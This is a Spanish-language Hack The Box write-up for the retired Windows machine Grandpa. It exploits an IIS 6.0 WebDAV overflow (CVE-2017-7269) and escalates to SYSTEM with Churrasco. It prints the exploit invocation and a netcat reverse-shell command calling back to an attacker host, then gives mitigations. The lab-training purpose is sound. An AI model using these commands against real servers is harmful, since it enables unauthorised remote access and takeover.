---
machine: Grandpa
os: Windows
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [windows, iis, webdav, cve-2017-7269, seimpersonate, churrasco]
---

# Grandpa — Hack The Box (Windows)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

IIS 6.0 con WebDAV es vulnerable a CVE-2017-7269, un desbordamiento en `ScStoragePathFromUrl` alcanzable con un `PROPFIND` malformado. El shell es `NETWORK SERVICE`; con `SeImpersonatePrivilege` y Churrasco se obtiene `SYSTEM`.

## Enumeración

```bash
nmap -p- --min-rate 5000 -T4 <IP>
nmap -sC -sV -p80 <IP>
```

```text
80/tcp open  http  Microsoft IIS httpd 6.0
```

El servidor es Windows Server 2003. Se confirma WebDAV con `OPTIONS` y `PROPFIND`. A diferencia de Granny, aquí el vector principal es el desbordamiento, no la subida de ficheros.

## Acceso inicial

Se usa un exploit público de CVE-2017-7269 que envía un `PROPFIND` con una cabecera `If:` sobredimensionada:

```bash
python3 iis6-exploit-2017-CVE-2017-7269.py <IP> 80
```

El exploit abre una shell reversa como `NT AUTHORITY\NETWORK SERVICE`.

## Escalada a SYSTEM

```bash
whoami /priv
# SeImpersonatePrivilege  Enabled
```

Se transfiere `churrasco.exe` y `nc.exe` al host (SMB, TFTP o `copy` desde un recurso compartido):

```cmd
C:\temp\churrasco.exe -d "C:\temp\nc.exe -e cmd.exe <LHOST> <LPORT>"
```

El listener recibe `NT AUTHORITY\SYSTEM`. Se lee la flag y se redacta.

## Evidencia

- `nmap` con IIS 6.0.
- Petición `PROPFIND` del exploit y shell como `NETWORK SERVICE`.
- `whoami /priv`.
- Shell SYSTEM con Churrasco.

## Lecciones aprendidas

- CVE-2017-7269 es un desbordamiento de pila en el parseo de rutas WebDAV.
- Un `PROPFIND` puede ser suficiente para RCE en IIS 6.0.
- `NETWORK SERVICE` con `SeImpersonatePrivilege` lleva a SYSTEM en Server 2003.
- La transferencia de herramientas en sistemas antiguos requiere alternativas a `certutil`.

## Mitigación y detección

- Deshabilitar WebDAV y actualizar IIS/Windows Server.
- Bloquear `PROPFIND` con cabeceras `If:` anómalas en el WAF.
- Restringir `SeImpersonatePrivilege`.
- Detectar procesos hijos de `w3wp.exe` y conexiones salientes desde IIS.

## Referencias

- <https://nvd.nist.gov/vuln/detail/CVE-2017-7269>
- <https://www.hackthebox.com/machines/grandpa>
- <https://attack.mitre.org/techniques/T1190/>
